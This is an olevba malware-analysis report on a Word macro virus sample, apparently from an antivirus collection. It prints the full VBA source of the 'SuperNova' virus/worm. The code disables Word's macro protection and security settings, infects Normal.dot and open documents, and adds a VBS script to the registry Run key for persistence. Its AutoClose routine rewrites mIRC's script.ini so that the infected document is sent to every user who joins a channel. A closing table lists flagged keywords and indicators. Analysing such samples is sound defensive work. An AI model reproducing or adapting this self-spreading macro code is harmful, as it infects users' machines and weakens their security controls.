olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.k-5052761b45e478e25df46aa1ae713137f645e243
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.k-5052761b45e478e25df46aa1ae713137f645e243 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SuperNova.bas 
in file: Virus.MSWord.Fool.k-5052761b45e478e25df46aa1ae713137f645e243 - OLE stream: 'Macros/VBA/SuperNova'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub SuperNova()
    On Error Resume Next
    ' W2K Only due to Normal Template Position
    ' SuperNova Virus/Worm v1.00 With VBS Backup
    ' by WalruS 07/00
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    StatusBar = "    SuperNova"
    Application.Caption = "SuperNova"
    Application.Username = "The WalruS"
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateFolder("C:\Windows\System\Backup")
    CommandBars("Help").Controls("About Microsoft Word").Caption = "SuperNova"
    Call InfectNormal
    Call InfectDocument
    Call LiveForever
End Sub

Sub InfectNormal()
On Error Resume Next
    If NormalTemplate.VBProject.VBComponents.Item("SuperNova").Name <> "SuperNova" Then
    ActiveDocument.VBProject.VBComponents("SuperNova").Export ("C:\Windows\SuperNova.drv")
    NormalTemplate.VBProject.VBComponents.import ("C:\Windows\SuperNova.drv")
    NormalTemplate.Save
    End If
End Sub

Sub InfectDocument()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("SuperNova").Name <> "SuperNova" Then
    NormalTemplate.VBProject.VBComponents("SuperNova").Export ("C:\Windows\SuperNova.drv")
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\SuperNova.drv")
    ActiveDocument.Save
    End If
End Sub

Sub LiveForever()
     System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SuperNova") = "C:\Windows\System\Backup\WalruS.vbs"
     Open "C:\Windows\System\Backup\WalruS.vbs" For Output As #1
         Print #1, "' WalruS.vbs for SuperNova by The WalruS"
         Print #1, "On Error Resume Next"
         Print #1, "Welcome_MsgBox_Message_Text   = "" Wally The WalruS Thanx Ya"""
         Print #1, "Welcome_MsgBox_Title_Text = ""SuperNova"""
         Print #1, "If Day(Now) = 1 Then Call Payload"
         Print #1, "Call Backup"
         Print #1, "Call Regedit"
         Print #1, "Sub Backup()"
         Print #1, "Dim fso, template"
         Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
         Print #1, "If (fso.FileExists(""C:\Windows\System\Backup\Normal.bak"")) Then"
         Print #1, "Call ReInfect"
         Print #1, "Else"
         Print #1, "Set template = fso.GetFile(""C:\Windows\Application Data\Microsoft\Templates\Normal.dot"")"
         Print #1, "template.Copy (""C:\Windows\System\Backup\Normal.bak"")"
         Print #1, "End If"
         Print #1, "End Sub"
         Print #1, "Sub ReInfect()"
         Print #1, "Dim fso, newtemp"
         Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
         Print #1, "Set newtemp = fso.GetFile(""C:\Windows\System\Backup\Normal.bak"")"
         Print #1, "newtemp.Copy(""C:\Windows\Application Data\Microsoft\Templates\Normal.dot"")"
         Print #1, "End Sub"
         Print #1, "Sub Regedit()"
         Print #1, "Dim WSHShell"
         Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
         Print #1, "WSHShell.RegWrite ""HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"", ""www.walrus.8k.com"""
         Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner"", ""The WalruS"""
         Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization"", ""SuperNova""  "
         Print #1, "End Sub"
         Print #1, "Sub Payload()"
         Print #1, "Dim intDoIt"
         Print #1, "intDoIt = MsgBox(Welcome_MsgBox_Message_Text,    _ "
         Print #1, "vbOKCancel + vbInformation,       _"
         Print #1, "Welcome_MsgBox_Title_Text )"
         Print #1, "If intDoIt = vbCancel Then"
         Print #1, "WScript.Quit"
         Print #1, "End If"
         Print #1, "End Sub"
    Close #1
End Sub

Sub AutoOpen(): SuperNova: End Sub

Sub AutoClose()
    On Error Resume Next
    ' Mirc Worm
    If (Second(Now()) > 50) Then
    installed = Dir("c:\mirc\mirc32.exe")
    If installed = "" Then
    Exit Sub
    Else
    reproduce = Dir("c:\mirc\download\SuperNova.doc")
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\SuperNova.doc"
    Kill "c:\mirc\script.ini"
    Open "c:\mirc\script.ini" For Output As #1
        Print #1, "[script]"
        Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\SuperNova.doc }"
        Print #1, "n1=on 1:CONNECT: {"
        Print #1, "n2=  /join #virus "
        Print #1, "n3=  /msg #virus Im supporting the SuperNova Virus [WalruS]"
        Print #1, "n4= /part #virus"
        Print #1, "n5= /clear"
        Print #1, "n6= }"
        Close #1
    End If
    End If
End Sub

Sub HelpAbout()
    MsgBox "SuperNova by The WalruS", 0, "SuperNova"
End Sub

Sub EditPaste()
    Selection.MoveStart
    Selection.TypeText "Wally the Walrus thanx ya"
End Sub

Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WalruS.vbs          |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

